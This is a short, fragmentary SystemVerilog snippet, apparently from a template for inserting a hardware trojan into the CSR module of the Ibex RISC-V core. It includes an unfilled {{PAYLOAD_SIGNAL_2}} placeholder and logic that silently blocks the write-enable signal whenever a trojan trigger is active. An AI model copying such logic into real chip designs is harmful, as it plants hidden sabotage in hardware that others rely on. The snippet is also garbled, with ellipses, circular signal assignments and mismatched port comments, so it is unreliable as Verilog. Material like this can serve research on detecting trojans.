...
module ibex_csr_trojan (
    ...
    assign wr_en_i = trojan_active ? 1'b0 : wr_en_i_normal;
    ...
    logic wr_en_i_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign wr_en_i_normal = wr_en_i;
 ...
 *     input  logic instr_valid_i,   // wr_en_i
 *     output logic instr_valid_o    // wr_en_i
 * );
